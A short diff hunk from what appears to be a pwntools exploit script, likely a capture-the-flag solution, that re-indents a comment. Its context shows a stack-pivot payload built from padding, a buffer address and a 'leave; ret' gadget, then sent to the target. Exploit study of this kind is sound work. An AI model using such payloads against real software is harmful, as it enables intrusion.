@@ -33,7 +33,7 @@ payload += flat(
 	b'A' * diff,
 	buffer_addr,
 	leave_ret		# Equivalent to "mov rsp, rbp
-								#	 pop rbp"
+									# pop rbp"
 )
 
 io.sendline(payload)
